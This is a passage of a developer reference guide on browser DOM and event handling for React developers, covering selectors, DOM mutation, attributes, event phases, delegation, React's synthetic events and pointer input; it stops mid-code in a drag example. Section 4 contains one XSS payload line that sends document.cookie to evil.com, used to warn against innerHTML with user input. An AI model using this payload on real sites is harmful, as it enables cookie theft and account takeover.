# Browser DOM and Events — Everything a React Developer Touches

**Priority: HIGH**

> The browser side of frontend work: the DOM, every common event (click, pointer, keyboard,
> focus, input, submit, scroll, resize, load, visibility…), the size and position
> properties, scrolling, observers, rendering cost, timing, page lifecycle, history,
> clipboard and drag and drop — and then how all of it looks from inside React: refs,
> native listeners, cleanup, stale state, `useLayoutEffect`, portals, SSR, recipes,
> TypeScript types, debugging and testing.
>
> Written for the moment you are coding and think "wait, which one is it —
> `clientWidth` or `offsetWidth`? `input` or `change`? why did my blur close the menu
> before the click landed?" Every section answers that kind of question first, then explains.
>
> Companions, not repeated here:
> [JAVASCRIPT-DEEP.md](JAVASCRIPT-DEEP.md) (event loop, closures),
> [../2-medium-priority/WEB-APIS-DEEP.md](../2-medium-priority/WEB-APIS-DEEP.md) (workers, IndexedDB, BroadcastChannel and the observers in more depth),
> [../2-medium-priority/BROWSER-INTERNALS-DEEP.md](../2-medium-priority/BROWSER-INTERNALS-DEEP.md) (rendering pipeline),
> [../2-medium-priority/BROWSER-COMPATIBILITY-DEEP.md](../2-medium-priority/BROWSER-COMPATIBILITY-DEEP.md) (Safari/mobile quirks).
>
> Support notes checked November 2026. Confirm newer APIs on MDN or caniuse before you ship.

---

## Table of Contents

- [1. The Mental Model — DOM, Window, and React](#1-the-mental-model--dom-window-and-react)
- [2. Finding Elements — Selecting and Traversing](#2-finding-elements--selecting-and-traversing)
- [3. Changing the DOM — Create, Insert, Move, Remove](#3-changing-the-dom--create-insert-move-remove)
- [4. Content — textContent, innerText, innerHTML](#4-content--textcontent-innertext-innerhtml)
- [5. Attributes vs Properties, Classes, Styles, Data](#5-attributes-vs-properties-classes-styles-data)
- [6. How Events Work — Listeners, Phases, Propagation](#6-how-events-work--listeners-phases-propagation)
- [7. The Event Object](#7-the-event-object)
- [8. Event Delegation](#8-event-delegation)
- [9. React's Event System](#9-reacts-event-system)
- [10. Mouse, Pointer, and Touch](#10-mouse-pointer-and-touch)
- [11. Keyboard Events](#11-keyboard-events)
- [12. Focus](#12-focus)
- [13. Forms and Inputs](#13-forms-and-inputs)
- [14. Sizes and Positions — The Measurement Properties](#14-sizes-and-positions--the-measurement-properties)
- [15. Scrolling](#15-scrolling)
- [16. Resize, Viewport, and Media Queries](#16-resize-viewport-and-media-queries)
- [17. Observers — Resize, Intersection, Mutation](#17-observers--resize-intersection-mutation)
- [18. Rendering, Reflow, and Layout Thrashing](#18-rendering-reflow-and-layout-thrashing)
- [19. Timing — setTimeout, requestAnimationFrame, Idle](#19-timing--settimeout-requestanimationframe-idle)
- [20. Debounce and Throttle for DOM Events](#20-debounce-and-throttle-for-dom-events)
- [21. Page Lifecycle and Window Events](#21-page-lifecycle-and-window-events)
- [22. URL, History, and Navigation](#22-url-history-and-navigation)
- [23. Selection, Clipboard, and Drag and Drop](#23-selection-clipboard-and-drag-and-drop)
- [24. Custom Events](#24-custom-events)
- [25. Refs — Reaching the DOM from React](#25-refs--reaching-the-dom-from-react)
- [26. Native Listeners in React — useEffect, Cleanup, Stale State](#26-native-listeners-in-react--useeffect-cleanup-stale-state)
- [27. useEffect vs useLayoutEffect, flushSync](#27-useeffect-vs-uselayouteffect-flushsync)
- [28. Portals and Event Bubbling](#28-portals-and-event-bubbling)
- [29. SSR and Hydration — When window Does Not Exist](#29-ssr-and-hydration--when-window-does-not-exist)
- [30. Recipes — Patterns You Build Again and Again](#30-recipes--patterns-you-build-again-and-again)
- [31. Dialogs, Popovers, and Positioning](#31-dialogs-popovers-and-positioning)
- [32. TypeScript Types for DOM and React Events](#32-typescript-types-for-dom-and-react-events)
- [33. Memory Leaks and Cleanup](#33-memory-leaks-and-cleanup)
- [34. Accessibility You Get or Lose Through Events](#34-accessibility-you-get-or-lose-through-events)
- [35. Debugging DOM and Events in DevTools](#35-debugging-dom-and-events-in-devtools)
- [36. Testing DOM Interactions](#36-testing-dom-interactions)
- [37. Common Pitfalls](#37-common-pitfalls)
- [38. Interview Questions](#38-interview-questions)
- [Related Files](#related-files)

---

## 1. The Mental Model — DOM, Window, and React

```text
‼️ THE PICTURE TO KEEP IN YOUR HEAD:

  window                      ← the tab: size, scroll, timers, location, history, events
  │                              like resize / scroll / load / keydown (global)
  └── document                ← the page: the DOM tree root
      └── <html>  (document.documentElement)
          ├── <head>
          └── <body> (document.body)
              └── <div id="root">   ← React owns everything inside this
                  └── ... your components' DOM nodes

  DOM = a tree of JavaScript objects (nodes) that the browser keeps in sync with
        what is on screen. Change a node → the browser re-styles, re-lays-out and
        re-paints what is affected.

  React = a library that keeps the DOM inside #root matching your JSX.
          You describe WHAT it should look like; React does the createElement /
          setAttribute / appendChild calls for you.
```

```text
NODE TYPES you actually meet:

  Node                       base class for everything in the tree
  ├── Element                tags: <div>, <svg>, ...   (nodeType 1)
  │   ├── HTMLElement        HTML tags: .hidden, .dataset, .focus(), .click()
  │   │   ├── HTMLInputElement   .value, .checked, .files, .select()
  │   │   ├── HTMLButtonElement  .disabled, .type, .form
  │   │   └── ... one class per tag
  │   └── SVGElement         <svg>, <path> — no .dataset quirks, use getAttribute
  ├── Text                   the text between tags     (nodeType 3)
  ├── Comment                <!-- -->                  (nodeType 8)
  └── Document / DocumentFragment

  EventTarget is ABOVE Node — window, document, every element, XMLHttpRequest,
  AbortSignal, WebSocket... all can addEventListener.
```

### ‼️ When a React developer still touches the DOM directly

React handles creating and updating nodes. You still reach for the real DOM when you need to:

| Need | Why React alone can't do it | Section |
|---|---|---|
| Focus an input, select text | Focus is imperative — there is no `focused` prop | [§12](#12-focus), [§25](#25-refs--reaching-the-dom-from-react) |
| Measure size/position | Layout only exists after the browser renders | [§14](#14-sizes-and-positions--the-measurement-properties), [§27](#27-useeffect-vs-uselayouteffect-flushsync) |
| Scroll somewhere | Scroll position is browser state | [§15](#15-scrolling) |
| Listen to `window`/`document` (resize, Escape, click outside) | Those nodes are outside your JSX | [§26](#26-native-listeners-in-react--useeffect-cleanup-stale-state) |
| `preventDefault` on wheel/touchmove | React registers those listeners as passive | [§9](#9-reacts-event-system) |
| Integrate a non-React library (chart, map, editor) | It wants a DOM node to own | [§25](#25-refs--reaching-the-dom-from-react) |
| Observe size/visibility | ResizeObserver / IntersectionObserver take nodes | [§17](#17-observers--resize-intersection-mutation) |

```text
‼️ THE ONE RULE: never structurally change DOM that React renders (remove/insert/move
   React-owned nodes, or replace their innerHTML). React's next update assumes its
   nodes are where it left them; if not, you get
   "Failed to execute 'removeChild' on 'Node': The node to be removed is not a child
   of this node." — the same crash browser extensions and Google Translate cause.
   Reading, focusing, measuring, scrolling, and adding listeners are all fine.
```

---

## 2. Finding Elements — Selecting and Traversing

```js
// ── Selecting ───────────────────────────────────────────────────────────────
document.getElementById('app');              // one element or null — fastest, id only
document.querySelector('.card[data-id="7"]'); // FIRST match of any CSS selector, or null
document.querySelectorAll('li.done');         // ALL matches — a STATIC NodeList
el.querySelector('button');                   // works on any element: searches only inside el

// The old live collections — still around, behave differently (see below)
document.getElementsByClassName('item');      // LIVE HTMLCollection
document.getElementsByTagName('li');          // LIVE HTMLCollection

// ── Testing an element ──────────────────────────────────────────────────────
el.matches('.btn.primary');     // true if el itself matches the selector
el.closest('[data-row-id]');    // nearest ancestor (or el itself) that matches, or null
                                // ‼️ the workhorse of event delegation (§8)
parent.contains(child);         // true if child is parent or anywhere inside it
                                // ‼️ the workhorse of "click outside" (§30)
```

```text
‼️ STATIC vs LIVE — a classic bug source

  querySelectorAll → static NodeList: a snapshot. Adding/removing elements later
                     does NOT change it.
  getElementsBy*   → live HTMLCollection: re-evaluated every time you read it.
  el.childNodes    → live NodeList.
  el.children      → live HTMLCollection.

  Bug: looping over a LIVE collection while removing items skips every second one,
       because the collection shrinks under the loop index.

     const items = document.getElementsByClassName('item');
     for (let i = 0; i < items.length; i++) items[i].classList.remove('item'); // skips!

  Fix: convert to an array first:  [...items].forEach(...)  or use querySelectorAll.

  NodeList has .forEach; HTMLCollection does NOT. Array.from() / spread works on both.
```

```js
// ── Traversing ──────────────────────────────────────────────────────────────
el.parentElement;          // parent element (parentNode can also be document)
el.children;               // child ELEMENTS only
el.childNodes;             // child NODES — includes whitespace Text nodes between tags!
el.firstElementChild;      // vs firstChild, which may be a whitespace Text node
el.lastElementChild;
el.nextElementSibling;     // vs nextSibling (may be Text)
el.previousElementSibling;

// ‼️ Prefer the *Element* versions. The plain ones (firstChild, nextSibling) return
// the newline-and-indent Text nodes between your tags, which is almost never what you want.

// Index of an element among its siblings
const index = [...el.parentElement.children].indexOf(el);
```

```text
Selector tips:
  - Attribute values with special characters need quoting:  [data-id="a:b"]
  - IDs that start with a digit or contain ':' (older React versions' useId produced
    ":r1:"-style ids) are invalid as #selectors. Use document.getElementById(id),
    or CSS.escape(id):  querySelector('#' + CSS.escape(id))
  - :scope inside el.querySelectorAll(':scope > li') means "el itself" — direct children only.
```

---

## 3. Changing the DOM — Create, Insert, Move, Remove

```js
// ── Create ──────────────────────────────────────────────────────────────────
const li = document.createElement('li');
li.textContent = 'Buy milk';
li.className = 'todo';
li.dataset.id = '42';                       // → data-id="42"

// SVG must be created in the SVG namespace or it will not render
const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');

// ── Insert (modern methods — accept several nodes AND plain strings) ────────
parent.append(li, 'text', otherNode);   // at the end, inside parent
parent.prepend(li);                     // at the start, inside parent
ref.before(li);                         // as ref's previous sibling
ref.after(li);                          // as ref's next sibling
ref.replaceWith(li);                    // swap ref for li
parent.replaceChildren(a, b);           // remove all children, then add a, b
parent.replaceChildren();               // ‼️ the clean way to empty an element

// Older methods you still see
parent.appendChild(li);                 // one node only, returns it
parent.insertBefore(li, refNode);       // refNode null → append at end
parent.removeChild(li);

// ── Remove ──────────────────────────────────────────────────────────────────
li.remove();                            // removes itself; no need to find the parent
```

```text
‼️ INSERTING AN EXISTING NODE MOVES IT. A node can only be in one place.
   list.append(existingItem) takes it out of wherever it was. To duplicate, clone:

     const copy = node.cloneNode(true);   // true = deep (children too)
                                          // ‼️ listeners added with addEventListener
                                          // are NOT copied; inline onclick attributes are.
                                          // Duplicate ids are copied too — fix them.
```

```js
// ── Inserting many nodes efficiently ────────────────────────────────────────
// Each insertion into the live document can trigger style/layout work. Build
// off-document first, then insert once.
const frag = document.createDocumentFragment();   // a lightweight, invisible container
for (const item of items) {
  const li = document.createElement('li');
  li.textContent = item.name;
  frag.append(li);                                // not in the document yet — cheap
}
list.append(frag);   // one insertion; the fragment empties itself into list

// ── <template> — inert HTML you clone ───────────────────────────────────────
// <template id="row"><tr><td class="name"></td></tr></template>
const tpl = document.getElementById('row');
const row = tpl.content.cloneNode(true);          // DocumentFragment copy
row.querySelector('.name').textContent = user.name;  // textContent — safe from XSS
tbody.append(row);
```

```js
// ── insertAdjacentHTML / insertAdjacentElement ──────────────────────────────
//   'beforebegin'  <div>  'afterbegin'  ...children...  'beforeend'  </div>  'afterend'
el.insertAdjacentHTML('beforeend', '<li>Static text only</li>');
// Parses HTML without destroying the existing children (unlike innerHTML +=,
// which re-parses and re-creates everything and throws away their listeners and state).
// ‼️ Still HTML parsing — never pass user input. See §4.
```

---

## 4. Content — textContent, innerText, innerHTML

| Property | Reads | Writes | Cost | Safe with user data? |
|---|---|---|---|---|
| `textContent` | All text, including hidden elements and `<script>`/`<style>` text | Plain text (one Text node) | Cheap — no layout | ‼️ **Yes** |
| `innerText` | Only *rendered* text, as shown (respects CSS, line breaks) | Plain text, `\n` → `<br>` | ‼️ **Forces layout** | Yes |
| `innerHTML` | Serialized HTML | Parses HTML, replaces all children | Parse + rebuild | ‼️ **No — XSS** |
| `outerHTML` | The element itself + content | Replaces the element | Parse + rebuild | No |

```js
// ‼️ XSS in one line: user-controlled HTML runs code
comment.innerHTML = userInput;
// userInput = '<img src=x onerror="fetch(`//evil.com?c=${document.cookie}`)">'
// The <img> fails to load, onerror runs attacker JavaScript in your origin.
// <script> tags inserted via innerHTML do NOT run — but event-handler attributes do.

comment.textContent = userInput;   // ✅ shown as literal text, never parsed

// If you genuinely need user-supplied HTML (rich text, markdown output):
import DOMPurify from 'dompurify';
comment.innerHTML = DOMPurify.sanitize(userInput);
```

```jsx
// React escapes everything you put in JSX — {userInput} is always text.
<p>{userInput}</p>                       // ✅ safe

// The escape hatch is deliberately ugly so you notice it in review:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
// ‼️ Also unsafe in React: href={userUrl} with "javascript:alert(1)".
//    React 19 blocks javascript: URLs in href/src, but validate URLs anyway
//    (allow only http:, https:, mailto:).
```

More: [../2-medium-priority/WEB-SECURITY-FRONTEND-DEEP.md](../2-medium-priority/WEB-SECURITY-FRONTEND-DEEP.md).

---

## 5. Attributes vs Properties, Classes, Styles, Data

```text
‼️ ATTRIBUTE = what is written in the HTML (always a string).
   PROPERTY  = the live JavaScript value on the DOM object (any type).

   Most are mirrored (id, className ↔ class, title). The ones that are NOT mirrored
   are where bugs live:

   <input value="initial">   ← user types "hello"

     input.getAttribute('value')  → "initial"   (attribute = initial / default value)
     input.defaultValue           → "initial"
     input.value                  → "hello"     ‼️ property = current value

   <input type="checkbox" checked>  ← user unchecks it
     input.hasAttribute('checked') → true
     input.checked                 → false      ‼️ property = current state

   <a href="/about">
     a.getAttribute('href') → "/about"           (as written)
     a.href                 → "https://site.com/about"   (resolved absolute URL)

   Boolean attributes (disabled, checked, hidden, required): presence = true.
     el.setAttribute('disabled', 'false')  → STILL DISABLED. The string doesn't matter.
     el.disabled = false  or  el.removeAttribute('disabled')  → enabled.
```

```js
// ── Attributes ──────────────────────────────────────────────────────────────
el.getAttribute('aria-expanded');     // "true" | "false" | null — strings!
el.setAttribute('aria-expanded', String(isOpen));
el.removeAttribute('hidden');
el.hasAttribute('disabled');
el.toggleAttribute('hidden', shouldHide);   // add/remove; 2nd arg forces

// ── Classes ─────────────────────────────────────────────────────────────────
el.classList.add('open', 'active');
el.classList.remove('open');
el.classList.toggle('open');                // returns the new state
el.classList.toggle('open', isOpen);        // force on/off — no if/else needed
el.classList.contains('open');
el.classList.replace('old', 'new');
el.className = 'a b';                       // replaces all classes at once

// ── data-* attributes ───────────────────────────────────────────────────────
// <div data-user-id="7" data-is-admin="true">
el.dataset.userId;          // "7"     ← kebab-case becomes camelCase
el.dataset.isAdmin;         // "true"  ← always a STRING, convert yourself
el.dataset.userId = '8';    // writes data-user-id="8"
delete el.dataset.userId;   // removes the attribute

// ── Inline styles ───────────────────────────────────────────────────────────
el.style.backgroundColor = 'red';             // camelCase property names
el.style.transform = `translateX(${x}px)`;    // ‼️ units required — '10' does nothing
el.style.setProperty('--progress', '40%');    // CSS custom properties need setProperty
el.style.removeProperty('--progress');
el.style.cssText = 'color: red; padding: 4px';// replaces ALL inline styles

// el.style only shows INLINE styles. To read what actually applies (from CSS files too):
const cs = getComputedStyle(el);
cs.display;                 // "flex"
cs.getPropertyValue('--progress');
cs.width;                   // "240px" — resolved; ‼️ reading this can force layout (§18)
```

```text
‼️ Prefer toggling a CLASS (or a data-state attribute) over setting many inline styles.
   CSS stays in CSS, transitions work, and one change = one style recalculation.
   Use inline styles / custom properties only for truly dynamic numbers (positions,
   progress, drag offsets).
```

### How React maps these

| HTML / DOM | React prop | Note |
|---|---|---|
| `class` | `className` | |
| `for` | `htmlFor` | on `<label>` |
| `value` (current) | `value` | makes the input **controlled** — React owns it |
| `value` (initial) | `defaultValue` | **uncontrolled** — DOM owns it after first render |
| `checked` / initial | `checked` / `defaultChecked` | same split |
| `style="color: red"` | `style={{ color: 'red' }}` | object, camelCase; numbers get `px` for most properties |
| `tabindex` | `tabIndex` | |
| `onclick="..."` | `onClick={fn}` | a function, never a string |
| `data-*`, `aria-*` | `data-user-id`, `aria-label` | stay kebab-case |
| boolean `disabled` | `disabled={false}` | React removes the attribute for `false` — no string trap |
| `--custom-prop` | `style={{ '--progress': '40%' }}` | TS: cast as `React.CSSProperties` |

---

## 6. How Events Work — Listeners, Phases, Propagation

```js
// ── Adding and removing ─────────────────────────────────────────────────────
function onClick(event) { /* ... */ }

button.addEventListener('click', onClick);
button.removeEventListener('click', onClick);   // ‼️ must be the SAME function reference

// ❌ This never removes anything: each arrow is a new function
button.addEventListener('click', () => save());
button.removeEventListener('click', () => save());

// ‼️ The capture flag is part of the identity too:
el.addEventListener('click', fn, { capture: true });
el.removeEventListener('click', fn);                    // ❌ doesn't match
el.removeEventListener('click', fn, { capture: true }); // ✅

// The same function added twice with the same options is only registered once.
```

```js
// ── The options object ──────────────────────────────────────────────────────
el.addEventListener('click', fn, {
  capture: false,   // true = run during the capture phase (top-down), see below
  once: true,       // auto-removed after the first call
  passive: true,    // you promise NOT to call preventDefault() — lets the browser
                    // scroll immediately without waiting for your JS (§15)
  signal,           // an AbortSignal: controller.abort() removes the listener
});

// ‼️ signal is the cleanest way to remove MANY listeners at once:
const controller = new AbortController();
window.addEventListener('resize', onResize, { signal: controller.signal });
window.addEventListener('scroll', onScroll, { signal: controller.signal, passive: true });
document.addEventListener('keydown', onKey, { signal: controller.signal });
// later — removes all three, no need to keep function references:
controller.abort();
```

```text
‼️ THE THREE PHASES of one click on <button> inside <li> inside <ul>

     window
       ↓  1. CAPTURE phase: window → document → html → body → ul → li
     document                      (only listeners added with capture: true run)
       ↓
      ...
     <ul>  ↓                 ↑
     <li>  ↓                 ↑
     <button>  2. TARGET phase — listeners on the button itself run
                         ↑
                         3. BUBBLE phase: li → ul → body → html → document → window
                            (normal listeners run here — the default)

   event.eventPhase: 1 = capturing, 2 = at target, 3 = bubbling

   Why it matters:
   - A parent can see (and react to) every click inside it      → delegation (§8)
   - A capture listener on document runs BEFORE any child can stopPropagation
     → used by "click outside", analytics, and focus-trap code that must always run
```

```text
EVENTS THAT DO NOT BUBBLE (event.bubbles === false):
  focus, blur                   → use focusin / focusout, which DO bubble
  mouseenter, mouseleave        → use mouseover / mouseout to bubble
  pointerenter, pointerleave
  load, error on <img>/<script> (they fire on the element only)
  scroll on an element          (scroll on document reaches window)
  resize                        (fires on window only)
  media events: play, pause, ended, ...
  invalid on form fields, toggle/beforetoggle on popovers & <details>

  ‼️ Non-bubbling events still go through the CAPTURE phase. So
     document.addEventListener('focus', fn, true) sees every focus on the page.
```

```js
// ── Stopping things ─────────────────────────────────────────────────────────
event.preventDefault();
// Cancels the BROWSER'S DEFAULT ACTION: following a link, submitting a form,
// checking a checkbox, scrolling on wheel, opening the context menu, moving focus on mousedown.
// Does NOT stop other listeners or propagation.
// Only works if event.cancelable is true. Check event.defaultPrevented later.

event.stopPropagation();
// Stops the event moving to the NEXT element (up or down the tree).
// Other listeners on the CURRENT element still run. The default action still happens.

event.stopImmediatePropagation();
// stopPropagation + also skip the remaining listeners on the current element.
```

```text
‼️ preventDefault and stopPropagation are completely different things:

               | browser default action | other elements' listeners |
   ------------+------------------------+---------------------------+
   preventDefault       stopped                 still run
   stopPropagation      still happens           stopped

   Clicking a link inside a card where the card also has onClick:
     want "open the link, don't trigger the card"  → stopPropagation in the link handler
     want "don't navigate, handle it in JS"        → preventDefault

‼️ Avoid stopPropagation as a habit. It silently breaks code you don't own:
   click-outside handlers, analytics, dropdown libraries, React's own event system.
   Prefer checking event.target in the parent, or event.defaultPrevented.
```

```text
LISTENER ORDER:
  - On one element, listeners run in the order they were added.
  - Inline handler (el.onclick = fn or onclick="") counts as one listener; assigning
    el.onclick again REPLACES it (addEventListener never replaces).
  - All listeners for an event run synchronously, one after another, inside
    dispatch. A slow listener delays the next one and the paint.
  - Exceptions in one listener are reported but don't stop the others.
```

---

## 7. The Event Object

```js
el.addEventListener('click', (e) => {
  e.type;            // "click"
  e.target;          // ‼️ the element that was actually clicked — could be a deep child
  e.currentTarget;   // ‼️ the element THIS listener is attached to (== el here)
  e.eventPhase;      // 1 capture, 2 target, 3 bubble
  e.bubbles;         // does this event type bubble?
  e.cancelable;      // can preventDefault cancel anything?
  e.defaultPrevented;// has someone already called preventDefault?
  e.isTrusted;       // true = real user action; false = el.dispatchEvent / el.click()
  e.timeStamp;       // ms since page load (high resolution)
  e.composedPath();  // array of every node the event travels through, target first —
                     // also sees inside open shadow DOM (web components)
});
```

```text
‼️ target vs currentTarget — the most common confusion

   <button class="buy"><svg>...</svg> <span>Buy</span></button>

   button.addEventListener('click', e => ...)

   User clicks on the icon:
     e.target         → <svg>  (or even <path> inside it)
     e.currentTarget  → <button>

   So   e.target.dataset.id   is undefined (svg has no data-id),
   while e.currentTarget.dataset.id works.

   Rule: reading data from "the thing I attached to" → currentTarget.
         "which child was clicked"                    → target (+ closest(), §8).

   ‼️ currentTarget is null after the handler returns. If you log the event and inspect
   it later in the console, or read it after an await, it's gone. Save it first:
     const btn = e.currentTarget;  await save();  btn.disabled = false;
   (React's synthetic event behaves the same.)

   CSS trick that removes the problem for icons: .buy svg { pointer-events: none; }
   → clicks on the svg go to the button, so target === the button.
```

Other properties by event family:

| Family | Useful properties |
|---|---|
| Mouse / Pointer | `clientX/Y`, `pageX/Y`, `offsetX/Y`, `screenX/Y`, `movementX/Y`, `button`, `buttons`, `altKey/ctrlKey/metaKey/shiftKey`, `relatedTarget`, `detail` (click count), `pointerId`, `pointerType`, `pressure`, `isPrimary` (§10) |
| Keyboard | `key`, `code`, `repeat`, `isComposing`, modifier keys, `location` (§11) |
| Focus | `relatedTarget` (§12) |
| Input | `data`, `inputType`, `isComposing` (§13) |
| Wheel | `deltaX/Y/Z`, `deltaMode` (0 px, 1 lines, 2 pages) |
| Submit | `submitter` — which button submitted the form (§13) |
| Clipboard | `clipboardData` (§23) |
| Drag | `dataTransfer` (§23) |

---

## 8. Event Delegation

```text
‼️ ONE listener on a parent instead of one on every child.

   Works because events bubble: a click on any <li> reaches the <ul>.

   Benefits:
   - 1 listener instead of 1,000 (memory, setup time)
   - Children added LATER are handled automatically — no re-binding
   - Removing children never leaks listeners

   React itself is built on this: it puts one listener per event type on the root (§9).
   In React you rarely write delegation by hand — but you do in vanilla JS, in
   interviews, and in large lists/tables where you put one handler on the table.
```

```js
// <ul id="todos">
//   <li data-id="1"><span>Milk</span> <button class="delete">✕</button></li>
//   ...
// </ul>
const list = document.getElementById('todos');

list.addEventListener('click', (e) => {
  // ‼️ closest() walks up from whatever was clicked (maybe a text node's parent,
  // an icon inside the button) to the element you care about.
  const deleteBtn = e.target.closest('button.delete');
  if (deleteBtn && list.contains(deleteBtn)) {
    // list.contains guards against matching an ancestor OUTSIDE the list
    // (closest searches all the way up to <html>).
    const id = deleteBtn.closest('li').dataset.id;
    removeTodo(id);
    return;
  }

  const row = e.target.closest('li');
  if (row && list.contains(row)) toggleTodo(row.dataset.id);
});
```

```jsx
// The React equivalent — one handler on the <ul> for a large list
function TodoList({ todos, onDelete, onToggle }) {
  function handleClick(e) {
    const btn = e.target.closest('button[data-action]');
    if (!btn) return;
    const id = btn.closest('li').dataset.id;
    if (btn.dataset.action === 'delete') onDelete(id);
    if (btn.dataset.action === 'toggle') onToggle(id);
  }
  return (
    <ul onClick={handleClick}>
      {todos.map(t => (
        <li key={t.id} data-id={t.id}>
          <button data-action="toggle">{t.text}</button>
          <button data-action="delete" aria-label={`Delete ${t.text}`}>✕</button>
        </li>
      ))}
    </ul>
  );
}
// Usually NOT needed in React: an inline onClick={() => onDelete(t.id)} per row is cheap,
// because React already delegates. Reach for this in very large lists, or when you
// want rows to be memoized without passing a new function to each.
```

```text
Delegation limits:
  - Non-bubbling events (focus, mouseenter, scroll on elements) — use focusin,
    mouseover, or capture phase instead.
  - If a child calls stopPropagation, the parent never hears it.
  - e.target may be a Text node's parent or an SVG child — always use closest().
```

---

## 9. React's Event System

```text
‼️ HOW REACT DOES EVENTS (React 17+)

   You write:    <button onClick={handleClick}>

   React does NOT call button.addEventListener('click'). Instead, when you call
   createRoot(container), React adds ONE native listener per event type
   (capture + bubble) on the ROOT CONTAINER (#root).

   When a native click bubbles up to #root, React:
     1. finds the fiber for event.target
     2. walks up the React component tree collecting onClickCapture / onClick props
     3. wraps the native event in a SyntheticEvent
     4. calls your handlers in capture-then-bubble order

   (Before React 17 the listeners lived on `document`. Moving them to the root lets
    several React apps / versions live on one page.)
```

```jsx
function Example() {
  function handleClick(e) {
    e;                 // SyntheticEvent: same API as native — target, currentTarget,
                       // preventDefault, stopPropagation, clientX, key, ...
    e.nativeEvent;     // the real browser event underneath
    e.currentTarget;   // the element whose onClick this is
    e.stopPropagation(); // stops React propagation AND calls native stopPropagation
    e.preventDefault();  // ‼️ returning false does NOT work in React — call this
  }
  return (
    <div onClickCapture={() => console.log('1: capture, parent')}
         onClick={() => console.log('3: bubble, parent')}>
      <button onClick={handleClick}>2: target</button>
    </div>
  );
}
// Event pooling (e.persist()) was REMOVED in React 17 — you can read e after an await.
// (e.currentTarget is still null by then, like native; copy it first.)
```

### ‼️ React event names that do not mean what the DOM name means

| React prop | Native event underneath | Surprise |
|---|---|---|
| `onChange` on text inputs | `input` | ‼️ fires **on every keystroke**, not on blur like native `change` |
| `onFocus` / `onBlur` | `focusin` / `focusout` | ‼️ they **bubble** in React (native focus/blur don't) — a parent's `onBlur` fires when any child loses focus |
| `onMouseEnter` / `onMouseLeave` | emulated from `mouseover`/`mouseout` | don't bubble (matches native) |
| `onScroll` | `scroll` | doesn't bubble since React 17 (matches native) |
| `onDoubleClick` | `dblclick` | |
| `onWheel`, `onTouchStart`, `onTouchMove` | `wheel`, `touchstart`, `touchmove` | ‼️ **registered as passive** — `e.preventDefault()` is ignored with a console warning |

```jsx
// ‼️ Need preventDefault on wheel/touchmove (custom zoom, canvas pan, carousel)?
// Add a NATIVE non-passive listener through a ref.
function ZoomCanvas() {
  const ref = useRef(null);
  useEffect(() => {
    const el = ref.current;
    function onWheel(e) {
      e.preventDefault();            // works: we said passive: false
      zoomBy(e.deltaY);
    }
    el.addEventListener('wheel', onWheel, { passive: false });
    return () => el.removeEventListener('wheel', onWheel);
  }, []);
  return <canvas ref={ref} />;
}
```

```text
‼️ MIXING REACT HANDLERS AND NATIVE LISTENERS — the order

   Native listeners on elements INSIDE the tree fire first (the event hasn't
   reached #root yet). Then React's handlers run (at #root). Then native listeners
   on document / window.

     native listener on <button>      → 1
     React onClick on <button>        → 2   (dispatched from #root)
     React onClick on parent <div>    → 3
     native listener on document      → 4   (skipped if a React handler called
                                             e.stopPropagation(), since React 17)

   Consequences:
   - React e.stopPropagation() CANNOT stop a native listener attached directly to an
     inner element — it already ran.
   - A native listener on an inner element that calls stopPropagation() stops the
     event before it reaches #root → React's onClick never fires. ‼️ A third-party
     widget doing this is why "my onClick suddenly doesn't fire".
   - For document-level "click outside" listeners, prefer capture phase or
     'pointerdown' so a stopPropagation inside the app can't hide clicks from you.
```

---

## 10. Mouse, Pointer, and Touch

```text
‼️ WHICH FAMILY TO USE

  click          → "the user activated this". Fires for mouse, touch, pen, AND
                   keyboard (Enter on buttons/links, Space on buttons).
                   ‼️ For buttons and links, click is what you want — not mousedown.
  pointer events → anything about the pointer itself: drag, draw, resize handles,
                   hover effects, press-and-hold. One API for mouse + touch + pen.
  mouse events   → legacy; fine on desktop, but pointer events supersede them.
  touch events   → only for multi-touch gestures that pointer events can't express
                   well, or old code. Pointer events cover most needs.
```

```text
EVENT ORDER — one mouse click on a button:

  pointerover → pointerenter → mouseover → mouseenter      (when arriving)
  pointerdown → mousedown
      → (focus moves here: blur/focusout on old element, focus/focusin on button)
        ‼️ focus change is the DEFAULT ACTION of mousedown
  pointerup → mouseup
  click
  (second quick click: ... click, then dblclick; e.detail = 2)

ONE TAP on a touch screen:
  pointerover → pointerenter → pointerdown → touchstart
  pointerup → touchend
  → compatibility mouse events: mouseover → mousemove → mousedown → (focus) → mouseup
  click

  ‼️ No hover state exists on touch, but mouseover fires on tap → :hover "sticks"
     after tapping on some devices. Guard hover-only UI with @media (hover: hover).
  The old 300ms click delay is gone when the page has
     <meta name="viewport" content="width=device-width">.
```

```js
// ── Mouse button info ───────────────────────────────────────────────────────
e.button;   // which button CHANGED: 0 left, 1 middle, 2 right, 3 back, 4 forward
e.buttons;  // bitmask of buttons HELD now: 1 left, 2 right, 4 middle (use during move)
// 'click' only fires for the primary button. Middle → 'auxclick'. Right → 'contextmenu'
// (preventDefault on contextmenu to show your own menu).

// Modifier keys during clicks
if (e.metaKey || e.ctrlKey) { /* Cmd+click (Mac) / Ctrl+click: open in new tab */ }
if (e.shiftKey) { /* range selection */ }

// ‼️ If you intercept link clicks for client-side navigation, let modified clicks
// through, or Cmd+click "open in new tab" breaks:
function onLinkClick(e) {
  if (e.button !== 0 || e.metaKey || e.ctrlKey || e.shiftKey || e.altKey) return;
  e.preventDefault();
  navigate(e.currentTarget.getAttribute('href'));
}
```

```text
‼️ COORDINATES — four kinds of x/y

  clientX / clientY   relative to the VIEWPORT (visible window). Same coordinate
                      system as getBoundingClientRect() and position: fixed.
                      → use this 90% of the time.
  pageX / pageY       relative to the DOCUMENT (clientX + window.scrollX).
                      → absolute position on the page, for position: absolute on body.
  offsetX / offsetY   relative to e.target's padding edge.
                      ‼️ e.target may be a child, so the numbers jump when the
                      pointer moves over child elements. Compute it yourself instead:
                        const r = e.currentTarget.getBoundingClientRect();
                        const x = e.clientX - r.left;
  screenX / screenY   relative to the physical screen. Rarely useful.
  movementX / Y       delta since the last move event (pointer lock, drag deltas).
```

```js
// ── Dragging with pointer events + pointer capture ──────────────────────────
// ‼️ Without capture, a fast drag leaves the handle and pointermove stops arriving.
// setPointerCapture routes ALL further events for this pointer to the handle,
// even outside it or outside the window, until pointerup.
handle.addEventListener('pointerdown', (e) => {
  if (e.button !== 0) return;
  handle.setPointerCapture(e.pointerId);
  const startX = e.clientX;
  const startWidth = panel.offsetWidth;

  function onMove(ev) {
